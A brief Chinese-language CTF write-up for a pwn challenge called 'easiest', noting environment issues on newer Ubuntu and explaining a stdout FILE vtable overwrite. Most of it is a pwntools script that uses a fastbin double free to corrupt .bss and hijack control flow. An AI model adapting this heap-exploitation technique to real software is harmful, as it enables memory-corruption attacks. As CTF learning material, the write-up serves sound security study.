你圈pwner人手Ubuntu16.04

这题有毒，我在Arch不能正常运行，IO有问题，当时做的时候弄了好久没弄出来，以为是考点

赛后我又试了Ubuntu18.04也不行，最后重新下了16.04就能了....

搞能正常运行这题就没啥问题

没给libc猜2.23的版本，不过也可以远程测一下

修改bss段stdout指针，让vtable指针指向堆地址

```python
from pwn import *
context.log_level = "debug"
bin = ELF("./easiest")
libc = bin.libc
p = bin.process()

def Debug():
    gdb.attach(p)
    pause()

def add(idx,size,data):
    p.sendlineafter("delete \n","1")
    p.sendlineafter("(0-11):",str(idx))
    p.sendlineafter("Length:",str(size))
    p.sendlineafter("C:",data)

def delete(idx):
    p.sendlineafter("delete \n","2")
    p.sendlineafter("(0-11):",str(idx))

add(10, 0x110, p64(0x400946) * (0x100 // 0x8))
add(0, 0x31, 'a')
add(1, 0x31, 'b')
delete(0)
delete(1)
delete(0)
add(0, 0x31, p64(0x602082 - 8))
add(1, 0x31, 'neo is god')
add(1, 0x31, p64(0))
Debug()
add(11,0x31, 'a' * 6 + '\x00' * 0x10 + p64(0x6020c0 - 0x88))
p.sendlineafter("delete \n","1")
p.interactive()

```

